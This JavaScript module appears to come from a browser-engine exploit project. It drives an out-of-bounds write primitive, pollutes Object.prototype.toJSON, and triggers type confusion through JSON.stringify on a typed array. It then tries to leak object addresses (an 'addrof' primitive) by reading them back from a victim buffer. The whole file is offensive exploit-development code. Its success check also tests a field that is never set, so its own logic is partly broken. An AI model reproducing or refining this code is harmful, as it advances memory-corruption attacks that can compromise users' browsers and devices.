// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v18_CorrectedCaptureLogAndFinalFocus)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF = "OriginalHeisenbug_TypedArrayAddrof_v18_CorrectedCaptureLogAndFinalFocus";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let latest_known_probe_details_v18 = null; 
let object_to_leak_A_v18 = null;
let object_to_leak_B_v18 = null;
let victim_typed_array_ref_v18 = null;
let probe_call_count_v18 = 0;

function toJSON_TA_Probe_CorrectedCapture() {
    probe_call_count_v18++;
    let current_call_details = {
        call_number: probe_call_count_v18,
        probe_variant: "TA_Probe_Addrof_v18_CorrectedCaptureLogAndFinalFocus",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        this_is_victim_ref: false,
        this_is_prev_probe_return_marker: false,
        prev_probe_call_marker_val: null,
        writes_attempted_on_this: false,
        this_keys_after_write: null
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        current_call_details.this_is_victim_ref = (this === victim_typed_array_ref_v18);
        
        if (typeof this === 'object' && this !== null && this.hasOwnProperty('probe_source_call_marker_v18')) {
            current_call_details.this_is_prev_probe_return_marker = true;
            current_call_details.prev_probe_call_marker_val = this.probe_source_call_marker_v18;
        }

        logS3(`[${current_call_details.probe_variant}] Probe Call #${current_call_details.call_number}. 'this' type: ${current_call_details.this_type_in_toJSON}. IsVictim? ${current_call_details.this_is_victim_ref}. IsPrevReturnMarker? ${current_call_details.this_is_prev_probe_return_marker}${current_call_details.this_is_prev_probe_return_marker ? " (from call #" + current_call_details.prev_probe_call_marker_val + ")" : ""}`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: TYPE CONFUSION DETECTED for 'this'! (IsVictim? ${current_call_details.this_is_victim_ref}, IsPrevReturnMarker? ${current_call_details.this_is_prev_probe_return_marker})`, "vuln");
            
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Attempting addrof writes on this confused 'this'...`, "warn");
            if (object_to_leak_A_v18) this[0] = object_to_leak_A_v18; // REATIVADO
            if (object_to_leak_B_v18) this[1] = object_to_leak_B_v18; // REATIVADO
            current_call_details.writes_attempted_on_this = true;
            try {
                current_call_details.this_keys_after_write = Object.keys(this);
                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Writes to confused 'this' attempted. 'this' keys now: ${current_call_details.this_keys_after_write.join(',')}`, "info");
            } catch (e_keys) {
                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Error getting keys from 'this' after write: ${e_keys.message}`, "warn");
                current_call_details.this_keys_after_write = ["Error getting keys"];
            }
        } else if (current_call_details.this_is_victim_ref) {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: 'this' is victim, type is ${current_call_details.this_type_in_toJSON}.`, "info");
        }
    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
    }
    
    latest_known_probe_details_v18 = current_call_details; // Atribuição de referência direta
    logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number} FINISHING. Global 'latest_known_probe_details_v18' ASSIGNED. Contents: ${JSON.stringify(latest_known_probe_details_v18)}`, "dev_verbose");

    return { "probe_source_call_marker_v18": current_call_details.call_number }; 
}

export async function executeTypedArrayVictimAddrofTest_CorrectedCaptureLogAndFinalFocus() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (CorrectedCaptureLogAndFinalFocus) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF} Init...`;

    probe_call_count_v18 = 0;
    latest_known_probe_details_v18 = null; 
    victim_typed_array_ref_v18 = null; 
    object_to_leak_A_v18 = { marker: "ObjA_TA_v18clff", id: Date.now() }; 
    object_to_leak_B_v18 = { marker: "ObjB_TA_v18clff", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    let captured_details_of_last_probe_run = null; 
    let heisenbugConfirmedByCapturedLogic = false;
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A: Default" };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B: Default" };
    const fillPattern = 0.18181818181818;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v18 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v18.buffer); 
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) float64_view_on_underlying_ab[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v18 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_CorrectedCapture, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} polluted.`, "info", FNAME_CURRENT_TEST);
            
            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v18)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v18); 
            logS3(`  JSON.stringify completed. Stringify Output (first 100 chars): ${stringifyOutput ? stringifyOutput.substring(0,100) + "..." : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            // FAZ UMA CÓPIA PROFUNDA da variável global latest_known_probe_details_v18
            // Esta é a leitura crucial do estado final da sonda.
            if (latest_known_probe_details_v18) { // latest_known_probe_details_v18 DEVE ser o objeto da última chamada
                captured_details_of_last_probe_run = JSON.parse(JSON.stringify(latest_known_probe_details_v18)); 
            }
            logS3(`  EXECUTE: Captured details of LAST probe run (deep copy of global 'latest_known_probe_details_v18'): ${captured_details_of_last_probe_run ? JSON.stringify(captured_details_of_last_probe_run) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (captured_details_of_last_probe_run && 
                captured_details_of_last_probe_run.probe_called &&
                captured_details_of_last_probe_run.this_type_in_toJSON === "[object Object]") {
                heisenbugConfirmedByCapturedLogic = true;
                logS3(`  EXECUTE: HEISENBUG CONFIRMED by captured_details_of_last_probe_run! 'this' type: ${captured_details_of_last_probe_run.this_type_in_toJSON} (Call #${captured_details_of_last_probe_run.call_number})`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug NOT confirmed by captured_details_of_last_probe_run. Last type: ${captured_details_of_last_probe_run ? captured_details_of_last_probe_run.this_type_in_toJSON : 'N/A (or probe not called)'}`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking victim buffer...", "warn", FNAME_CURRENT_TEST);
            // ... (Lógica de verificação de addrof_result_A e addrof_result_B)
            const val_A = float64_view_on_underlying_ab[0];
            addrof_result_A.leaked_address_as_double = val_A;
            let temp_A = new ArrayBuffer(8); new Float64Array(temp_A)[0] = val_A;
            addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_A)[0], new Uint32Array(temp_A)[1]);
            if (val_A !== (fillPattern + 0) && val_A !== 0 && (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_result_A.success = true;
                addrof_result_A.message = "Possible pointer for ObjA.";
            } else {
                addrof_result_A.message = `No pointer for ObjA. ${heisenbugConfirmedByCapturedLogic ? "TC obs, " : ""}Buffer unchanged.`;
            }

            const val_B = float64_view_on_underlying_ab[1];
            addrof_result_B.leaked_address_as_double = val_B;
            let temp_B = new ArrayBuffer(8); new Float64Array(temp_B)[0] = val_B;
            addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_B)[0], new Uint32Array(temp_B)[1]);
            if (val_B !== (fillPattern + 1) && val_B !== 0 && (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_result_B.success = true;
                addrof_result_B.message = "Possible pointer for ObjB.";
            } else {
                addrof_result_B.message = `No pointer for ObjB. ${heisenbugConfirmedByCapturedLogic ? "TC obs, " : ""}Buffer unchanged.`;
            }

            if (addrof_result_A.success || addrof_result_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF}: Addr? SUCESSO!`;
            } else if (heisenbugConfirmedByCapturedLogic) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF}: Heisenbug Fail?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V18_CLFF} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v18}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v18 = null; 
        latest_known_probe_details_v18 = null; 
        probe_call_count_v18 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_details_of_last_probe_run, 
        total_probe_calls: probe_call_count_v18, // será 0 aqui, o runner deve usar o log interno
        addrof_A_attempt_result: addrof_result_A,
        addrof_B_attempt_result: addrof_result_B
    };
}
